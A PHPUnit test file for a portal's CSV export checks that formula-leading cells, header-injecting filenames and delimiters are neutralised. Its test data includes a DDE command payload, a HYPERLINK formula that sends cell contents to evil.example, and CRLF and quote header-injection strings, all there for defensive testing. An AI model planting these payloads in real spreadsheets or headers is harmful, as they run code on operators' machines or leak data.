<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;

require_once dirname(__DIR__, 2) . '/lib/portal_export.php';

/**
 * The CSV export hands portal data to a spreadsheet, which is an interpreter:
 * a cell that begins with a formula character is executed on open, and the
 * classic DDE payload (=cmd|'/c calc'!A1) turns a log line an attacker could
 * influence into code running on the operator's workstation. portal_csv_guard()
 * is the only thing standing between the two, so its lead-character set is
 * pinned here rather than left to be re-derived.
 *
 * Pure string generation, no DB, no HTTP.
 */
final class PortalCsvExportTest extends TestCase
{
    /** @return array<string, array{0: string}> */
    public static function formulaLeadProvider(): array
    {
        return [
            'equals'      => ['=1+1'],
            'plus'        => ['+1+1'],
            'minus'       => ['-1+1'],
            'at'          => ['@SUM(A1)'],
            'tab'         => ["\t=1+1"],
            'cr'          => ["\r=1+1"],
            'dde payload' => ["=cmd|'/c calc'!A1"],
            'hyperlink'   => ['=HYPERLINK("http://evil.example/?x="&A1,"click")'],
        ];
    }

    #[PHPUnit\Framework\Attributes\DataProvider('formulaLeadProvider')]
    public function testFormulaLeadIsNeutralizedWithALeadingQuote(string $value): void
    {
        $guarded = portal_csv_guard($value);

        self::assertSame("'" . $value, $guarded, 'the leading quote makes the spreadsheet treat the cell as text');
        self::assertNotSame($value[0], $guarded[0], 'the cell no longer begins with a formula character');
    }

    public function testOrdinaryValuesAreLeftAlone(): void
    {
        // The guard must not "fix" values that are not formulas: a quote prefixed
        // onto every cell would show up verbatim in the spreadsheet.
        foreach (['web01', 'Übermäßig-Straße 42 ß', '2026-07-12 10:00:00', '', '0', 'a=b', '1.5'] as $value) {
            self::assertSame($value, portal_csv_guard($value), 'unchanged: ' . $value);
        }
    }

    /**
     * A formula character in the middle is harmless; only the lead position makes
     * a spreadsheet interpret the cell.
     */
    public function testFormulaCharacterInsideTheValueIsNotEscaped(): void
    {
        self::assertSame('total=1+1', portal_csv_guard('total=1+1'));
    }

    /**
     * A negative number is the price of the guard: it leaves the sheet as text.
     * Pinned deliberately, so this shows up as an intentional trade-off rather
     * than as a surprise in a spreadsheet that will not sum a column.
     */
    public function testNegativeNumberIsTreatedAsAFormulaLead(): void
    {
        self::assertSame("'-5", portal_csv_guard('-5'));
    }

    /**
     * The filename carries a mission name, i.e. user input, into a quoted
     * Content-Disposition value, where a quote would end the value early. The
     * slug is what keeps that from happening, so its surviving character set is
     * pinned here.
     */
    public function testFilenameSlugKeepsOnlyHarmlessCharacters(): void
    {
        self::assertSame('vms-PROD-01', portal_csv_filename_slug('vms-PROD-01'), 'an ordinary name is untouched');
        self::assertSame('vms-_TPL_BASE', portal_csv_filename_slug('vms-[TPL] BASE'), 'brackets and spaces collapse');
        self::assertSame(
            'vms-a_filename_evil.html',
            portal_csv_filename_slug('vms-a"; filename="evil.html'),
            'the quote is gone, so it cannot end the quoted filename and append a second one'
        );
        self::assertSame(
            'vms-a_X-Evil_1_b',
            portal_csv_filename_slug("vms-a\r\nX-Evil: 1\r\nb"),
            'CR/LF never reach the header'
        );
        self::assertSame('vms-_berm_ig', portal_csv_filename_slug('vms-Übermäßig'), 'the header stays ASCII');
        self::assertSame('export', portal_csv_filename_slug('"""'), 'a name that slugs away entirely still yields a filename');
    }

    /**
     * German Excel opens a comma CSV into a single column and guesses the encoding
     * from the system code page, so the export writes a BOM and uses semicolons.
     * Both are load-bearing for the operator, not cosmetics. This renders the same
     * way portal_send_csv() does (fputcsv with the same delimiter and no escape
     * character) but without the headers-and-exit part, which needs a real request.
     */
    public function testRenderedRowsQuoteDelimitersUmlautsAndEmbeddedQuotes(): void
    {
        $stream = fopen('php://memory', 'r+');
        self::assertNotFalse($stream);

        fwrite($stream, "\xEF\xBB\xBF");
        $rows = [
            ['Name', 'Notiz'],
            ['Übermäßig-Straße', 'a;b'],
            ['quote"inside', "line1\nline2"],
            ['=1+1', 'harmlos'],
        ];
        foreach ($rows as $row) {
            fputcsv($stream, array_map('portal_csv_guard', $row), ';', '"', '');
        }
        rewind($stream);
        $csv = (string) stream_get_contents($stream);
        fclose($stream);

        self::assertStringStartsWith("\xEF\xBB\xBF", $csv, 'the BOM is what makes Excel read it as UTF-8');
        self::assertStringContainsString('Übermäßig-Straße', $csv, 'umlauts survive as UTF-8, not as entities');
        self::assertStringContainsString('"a;b"', $csv, 'a semicolon inside a value is quoted, not a new column');
        self::assertStringContainsString('"quote""inside"', $csv, 'an embedded quote is doubled, CSV style');
        self::assertStringContainsString("\"line1\nline2\"", $csv, 'a newline stays inside its quoted cell');
        self::assertStringContainsString("'=1+1", $csv, 'the formula guard survives into the rendered row');

        // Round-trip through a parser: the structure must come back as exactly
        // four rows of two columns, i.e. no value broke out of its cell.
        $stream = fopen('php://memory', 'r+');
        self::assertNotFalse($stream);
        fwrite($stream, substr($csv, 3)); // drop the BOM before parsing
        rewind($stream);
        $back = [];
        while (($cells = fgetcsv($stream, 0, ';', '"', '')) !== false) {
            $back[] = $cells;
        }
        fclose($stream);

        self::assertCount(4, $back, 'four rows in, four rows out: nothing broke the row structure');
        foreach ($back as $cells) {
            self::assertCount(2, $cells, 'every row keeps exactly its two columns');
        }
        self::assertSame('a;b', $back[1][1], 'the semicolon comes back as data, not as a column break');
        self::assertSame("line1\nline2", $back[2][1]);
    }
}
